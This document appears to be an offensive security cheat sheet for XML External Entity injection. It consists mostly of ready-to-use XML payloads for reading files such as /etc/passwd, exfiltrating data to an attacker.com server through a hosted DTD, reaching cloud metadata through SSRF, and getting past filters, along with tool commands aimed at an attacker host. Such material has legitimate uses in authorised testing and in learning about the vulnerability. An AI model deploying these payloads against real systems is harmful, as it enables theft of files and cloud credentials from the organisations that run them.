# XXE: XML External Entity Injection

## Detection Methodology

Test every endpoint that accepts XML or can be switched to XML via Content-Type:

```xml
<!-- Basic probe -->
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/hostname">]>
<root>&test;</root>

<!-- Blind XXE probe (OOB) -->
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY % xxe SYSTEM "http://collaborator.oastify.com/"> %xxe;]>
<root/>
```

## Exploitation Techniques

### In-Band File Read
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>
```

### Blind XXE via External DTD
Host `evil.dtd` on attacker server:
```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY % exfil SYSTEM 'http://attacker.com/log?data=%file;'>">
%eval;
%exfil;
```

Victim payload:
```xml
<?xml version="1.0"?>
<!DOCTYPE r [
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<r/>
```

### XXE → SSRF (Cloud Metadata)
```xml
<!DOCTYPE r [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<r>&xxe;</r>
```

### Error-Based XXE (No OOB, No Reflection)
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY % error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

## Bypass Techniques

### Parameter Entity Bypass
When `&` is filtered, use parameter entities (`%`) instead:
```xml
<!DOCTYPE root [
  <!ENTITY % param1 SYSTEM "file:///etc/passwd">
  %param1;
]>
```

### UTF-7 Encoding
```xml
<?xml version="1.0" encoding="UTF-7"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>
```

### Local DTD Repurposing
When no external access is available, use local DTD files:
```xml
<!DOCTYPE r [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
  <!ENTITY % ISOamso "
    <!ENTITY % file SYSTEM 'file:///etc/passwd'>
    <!ENTITY % eval '<!ENTITY &#x25; error SYSTEM "file:///nonexistent/%file;">'>
    %eval;
    %error;
  ">
  %local_dtd;
]>
```

## Tooling

```bash
# XXEinjector - automated blind XXE
ruby XXEinjector.rb --host=attacker.com --file=/etc/passwd --path=/uploads
# oxml_xxe - Office format XXE injection
python oxml_xxe.py -f document.docx --xxe "file:///etc/passwd"
```
